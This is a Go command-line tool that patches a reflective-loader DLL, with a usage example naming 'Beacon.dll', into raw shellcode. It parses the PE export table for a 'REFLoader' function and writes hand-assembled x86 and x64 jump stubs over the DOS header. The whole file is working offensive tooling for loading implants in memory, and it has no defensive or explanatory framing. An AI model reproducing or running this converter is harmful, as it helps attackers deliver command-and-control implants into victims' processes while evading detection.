package main

import (
	"bytes"
	"debug/pe"
	"encoding/binary"
	"errors"
	"fmt"
	"log"
	"os"
)

const (
	imageDirectoryEntryExport = 0
	dosELfanewOffset          = 0x3c
	stubReturnAddressOffset   = 9
	defaultLoaderExport       = "REFLoader"
	defaultOutputPath         = "shellcode_embed.bin"
)

type targetArch int

const (
	archUnknown targetArch = iota
	archX86
	archX64
)

type exportDirectory struct {
	Characteristics       uint32
	TimeDateStamp         uint32
	MajorVersion          uint16
	MinorVersion          uint16
	Name                  uint32
	Base                  uint32
	NumberOfFunctions     uint32
	NumberOfNames         uint32
	AddressOfFunctions    uint32
	AddressOfNames        uint32
	AddressOfNameOrdinals uint32
}

func main() {
	printBanner()

	if len(os.Args) < 2 {
		fmt.Println("[-] Error: missing DLL path parameter")
		fmt.Println("[*] Usage: patch_reflective_stub.exe <DLL Path> [Output File Path] [Loader Export Name]")
		fmt.Println(`[*] Example: patch_reflective_stub.exe D:\path\Beacon.dll D:\path\Beacon_shellcode.bin REFLoader`)
		os.Exit(1)
	}

	inputPath := os.Args[1]
	outputPath := defaultOutputPath
	loaderName := defaultLoaderExport
	loaderExplicit := false

	if len(os.Args) >= 3 {
		outputPath = os.Args[2]
	}
	if len(os.Args) >= 4 {
		loaderName = os.Args[3]
		loaderExplicit = true
	}

	fmt.Printf("[+] Opening DLL: %s\n", inputPath)
	dllData, err := os.ReadFile(inputPath)
	if err != nil {
		log.Fatalf("[-] Error reading DLL: %v", err)
	}
	fmt.Printf("[*] DLL size: %d bytes\n", len(dllData))

	if len(dllData) < dosELfanewOffset+4 {
		log.Fatalf("[-] DLL is too small to contain a DOS header")
	}
	if binary.LittleEndian.Uint16(dllData[0:2]) != 0x5a4d {
		log.Fatalf("[-] Input does not start with MZ")
	}

	originalELfanew := binary.LittleEndian.Uint32(dllData[dosELfanewOffset : dosELfanewOffset+4])

	peFile, err := pe.NewFile(bytes.NewReader(dllData))
	if err != nil {
		log.Fatalf("[-] Error parsing PE file: %v", err)
	}
	defer peFile.Close()

	arch, desc, err := validateDLL(peFile)
	if err != nil {
		log.Fatalf("[-] Unsupported PE: %v", err)
	}
	fmt.Printf("[+] PE validated: %s\n", desc)

	resolvedLoaderName, funcRVA, funcOffset, err := findLoaderWithFallback(peFile, arch, loaderName, loaderExplicit, dllData)
	if err != nil {
		log.Fatalf("[-] Error locating loader: %v", err)
	}
	fmt.Printf("[+] Found %s RVA: 0x%X\n", resolvedLoaderName, funcRVA)
	fmt.Printf("[+] Found %s file offset: 0x%X\n", resolvedLoaderName, funcOffset)

	stub, err := buildStub(arch, funcOffset)
	if err != nil {
		log.Fatalf("[-] Error building stub: %v", err)
	}
	if len(stub) > dosELfanewOffset {
		log.Fatalf("[-] Stub length 0x%X would overwrite e_lfanew at 0x%X", len(stub), dosELfanewOffset)
	}
	fmt.Printf("[+] Generated %s DOS-head stub: %d bytes\n", archName(arch), len(stub))

	patched := append([]byte(nil), dllData...)
	copy(patched, stub)

	patchedELfanew := binary.LittleEndian.Uint32(patched[dosELfanewOffset : dosELfanewOffset+4])
	if patchedELfanew != originalELfanew {
		log.Fatalf("[-] e_lfanew changed unexpectedly: before=0x%X after=0x%X", originalELfanew, patchedELfanew)
	}
	fmt.Printf("[+] Preserved DOS e_lfanew: 0x%X\n", patchedELfanew)

	if err := os.WriteFile(outputPath, patched, 0o644); err != nil {
		log.Fatalf("[-] Error writing output: %v", err)
	}

	fmt.Printf("[+] Output written: %s\n", outputPath)
	fmt.Printf("[+] Successfully generated patched blob: %d bytes\n", len(patched))
}

func printBanner() {
	fmt.Println("============================================================")
	fmt.Println(" patch_reflective_stub")
	fmt.Println(" Patch reflective DLL DOS head with a loader jump stub")
	fmt.Println("============================================================")
	fmt.Println()
}

func validateDLL(f *pe.File) (targetArch, string, error) {
	if f.FileHeader.Characteristics&pe.IMAGE_FILE_DLL == 0 {
		return archUnknown, "", errors.New("input PE is not marked as DLL")
	}

	switch f.FileHeader.Machine {
	case pe.IMAGE_FILE_MACHINE_I386:
		if _, ok := f.OptionalHeader.(*pe.OptionalHeader32); !ok {
			return archUnknown, "", errors.New("x86 DLL requires PE32 optional header")
		}
		return archX86, "I386 DLL / PE32", nil
	case pe.IMAGE_FILE_MACHINE_AMD64:
		if _, ok := f.OptionalHeader.(*pe.OptionalHeader64); !ok {
			return archUnknown, "", errors.New("x64 DLL requires PE32+ optional header")
		}
		return archX64, "AMD64 DLL / PE32+", nil
	default:
		return archUnknown, "", fmt.Errorf("unsupported machine 0x%X", f.FileHeader.Machine)
	}
}

func archName(arch targetArch) string {
	switch arch {
	case archX86:
		return "x86"
	case archX64:
		return "x64"
	default:
		return "unknown"
	}
}

func buildStub(arch targetArch, loaderFileOffset uint32) ([]byte, error) {
	switch arch {
	case archX86:
		return buildStubX86(loaderFileOffset)
	case archX64:
		return buildStubX64(loaderFileOffset)
	default:
		return nil, fmt.Errorf("unsupported architecture %d", arch)
	}
}

func buildStubX64(loaderFileOffset uint32) ([]byte, error) {
	if loaderFileOffset < stubReturnAddressOffset {
		return nil, fmt.Errorf("loader file offset 0x%X is too small", loaderFileOffset)
	}

	stub := []byte{
		0x4d, 0x5a, // pop r10 / preserve MZ bytes
		0x41, 0x52, // push r10
		0xe8, 0x00, 0x00, 0x00, 0x00, // call $+5
		0x58,       // pop rax
		0x48, 0x05, // add rax, imm32
	}

	displacement := loaderFileOffset - stubReturnAddressOffset
	imm := make([]byte, 4)
	binary.LittleEndian.PutUint32(imm, displacement)
	stub = append(stub, imm...)

	stub = append(stub,
		0x48, 0x83, 0xec, 0x28, // sub rsp, 0x28
		0xff, 0xd0, // call rax
		0x48, 0x83, 0xc4, 0x28, // add rsp, 0x28
		0xc3, // ret
	)

	return stub, nil
}

func buildStubX86(loaderFileOffset uint32) ([]byte, error) {
	if loaderFileOffset < stubReturnAddressOffset {
		return nil, fmt.Errorf("loader file offset 0x%X is too small", loaderFileOffset)
	}

	stub := []byte{
		0x4d,                         // dec ebp / preserve MZ bytes
		0x5a,                         // pop edx
		0x52,                         // push edx / restore return address
		0x45,                         // inc ebp
		0xe8, 0x00, 0x00, 0x00, 0x00, // call $+5
		0x58, // pop eax
		0x05, // add eax, imm32
	}

	displacement := loaderFileOffset - stubReturnAddressOffset
	imm := make([]byte, 4)
	binary.LittleEndian.PutUint32(imm, displacement)
	stub = append(stub, imm...)

	stub = append(stub,
		0xff, 0x74, 0x24, 0x04, // push dword ptr [esp+4]
		0xff, 0xd0, // call eax
		0xc2, 0x04, 0x00, // ret 4
	)

	return stub, nil
}

func findLoaderWithFallback(f *pe.File, arch targetArch, exportName string, explicit bool, data []byte) (string, uint32, uint32, error) {
	funcRVA, funcOffset, err := findLoader(f, arch, exportName, data)
	if err == nil {
		return exportName, funcRVA, funcOffset, nil
	}

	if explicit || arch != archX86 || exportName != defaultLoaderExport {
		return "", 0, 0, err
	}

	fallbackName := "_REFLoader@4"
	funcRVA, funcOffset, fallbackErr := findLoader(f, arch, fallbackName, data)
	if fallbackErr == nil {
		return fallbackName, funcRVA, funcOffset, nil
	}

	return "", 0, 0, fmt.Errorf("%v; fallback %q also failed: %w", err, fallbackName, fallbackErr)
}

func findLoader(f *pe.File, arch targetArch, exportName string, data []byte) (uint32, uint32, error) {
	exportDir, err := getExportDirectory(f, arch)
	if err != nil {
		return 0, 0, err
	}
	if exportDir.VirtualAddress == 0 || exportDir.Size == 0 {
		return 0, 0, errors.New("no export directory found")
	}

	exportOffset, err := rvaToFileOffset(f, exportDir.VirtualAddress)
	if err != nil {
		return 0, 0, fmt.Errorf("export directory offset: %w", err)
	}
	exportSize := uint32(exportDir.Size)
	if exportSize < 40 || !rangeInFile(data, exportOffset, 40) {
		return 0, 0, errors.New("export directory is truncated")
	}

	ed := parseExportDirectory(data[exportOffset : exportOffset+40])
	if ed.NumberOfNames == 0 || ed.NumberOfFunctions == 0 {
		return 0, 0, errors.New("export directory has no named functions")
	}

	namesOffset, err := rvaToFileOffset(f, ed.AddressOfNames)
	if err != nil {
		return 0, 0, fmt.Errorf("name table offset: %w", err)
	}
	ordinalsOffset, err := rvaToFileOffset(f, ed.AddressOfNameOrdinals)
	if err != nil {
		return 0, 0, fmt.Errorf("ordinal table offset: %w", err)
	}
	functionsOffset, err := rvaToFileOffset(f, ed.AddressOfFunctions)
	if err != nil {
		return 0, 0, fmt.Errorf("function table offset: %w", err)
	}

	if !rangeInFile(data, namesOffset, ed.NumberOfNames*4) ||
		!rangeInFile(data, ordinalsOffset, ed.NumberOfNames*2) ||
		!rangeInFile(data, functionsOffset, ed.NumberOfFunctions*4) {
		return 0, 0, errors.New("export arrays are truncated")
	}

	for i := uint32(0); i < ed.NumberOfNames; i++ {
		nameRVA := binary.LittleEndian.Uint32(data[namesOffset+i*4:])
		nameOffset, err := rvaToFileOffset(f, nameRVA)
		if err != nil {
			continue
		}

		name, err := readCString(data, nameOffset)
		if err != nil || name != exportName {
			continue
		}

		ordinal := binary.LittleEndian.Uint16(data[ordinalsOffset+i*2:])
		if uint32(ordinal) >= ed.NumberOfFunctions {
			return 0, 0, fmt.Errorf("export %q has invalid ordinal %d", exportName, ordinal)
		}

		funcRVA := binary.LittleEndian.Uint32(data[functionsOffset+uint32(ordinal)*4:])
		if funcRVA >= exportDir.VirtualAddress && funcRVA < exportDir.VirtualAddress+exportSize {
			return 0, 0, fmt.Errorf("export %q is forwarded, not a direct code RVA", exportName)
		}

		funcOffset, err := rvaToFileOffset(f, funcRVA)
		if err != nil {
			return 0, 0, fmt.Errorf("loader function offset: %w", err)
		}
		return funcRVA, funcOffset, nil
	}

	return 0, 0, fmt.Errorf("export %q not found", exportName)
}

func getExportDirectory(f *pe.File, arch targetArch) (pe.DataDirectory, error) {
	switch arch {
	case archX86:
		opt, ok := f.OptionalHeader.(*pe.OptionalHeader32)
		if !ok {
			return pe.DataDirectory{}, errors.New("x86 DLL requires PE32 optional header")
		}
		return opt.DataDirectory[imageDirectoryEntryExport], nil
	case archX64:
		opt, ok := f.OptionalHeader.(*pe.OptionalHeader64)
		if !ok {
			return pe.DataDirectory{}, errors.New("x64 DLL requires PE32+ optional header")
		}
		return opt.DataDirectory[imageDirectoryEntryExport], nil
	default:
		return pe.DataDirectory{}, fmt.Errorf("unsupported architecture %d", arch)
	}
}

func rvaToFileOffset(f *pe.File, rva uint32) (uint32, error) {
	for _, section := range f.Sections {
		start := section.VirtualAddress
		size := section.VirtualSize
		if section.Size > size {
			size = section.Size
		}
		end := start + size
		if rva >= start && rva < end {
			delta := rva - start
			if delta >= section.Size {
				return 0, fmt.Errorf("RVA 0x%X falls outside raw section data", rva)
			}
			return section.Offset + delta, nil
		}
	}
	return 0, fmt.Errorf("RVA 0x%X is not covered by any section", rva)
}

func parseExportDirectory(data []byte) exportDirectory {
	return exportDirectory{
		Characteristics:       binary.LittleEndian.Uint32(data[0:4]),
		TimeDateStamp:         binary.LittleEndian.Uint32(data[4:8]),
		MajorVersion:          binary.LittleEndian.Uint16(data[8:10]),
		MinorVersion:          binary.LittleEndian.Uint16(data[10:12]),
		Name:                  binary.LittleEndian.Uint32(data[12:16]),
		Base:                  binary.LittleEndian.Uint32(data[16:20]),
		NumberOfFunctions:     binary.LittleEndian.Uint32(data[20:24]),
		NumberOfNames:         binary.LittleEndian.Uint32(data[24:28]),
		AddressOfFunctions:    binary.LittleEndian.Uint32(data[28:32]),
		AddressOfNames:        binary.LittleEndian.Uint32(data[32:36]),
		AddressOfNameOrdinals: binary.LittleEndian.Uint32(data[36:40]),
	}
}

func readCString(data []byte, offset uint32) (string, error) {
	if offset >= uint32(len(data)) {
		return "", errors.New("string offset is outside file")
	}
	value := data[offset:]
	end := bytes.IndexByte(value, 0)
	if end < 0 {
		return "", errors.New("unterminated export name")
	}
	return string(value[:end]), nil
}

func rangeInFile(data []byte, offset uint32, size uint32) bool {
	end := uint64(offset) + uint64(size)
	return end <= uint64(len(data))
}
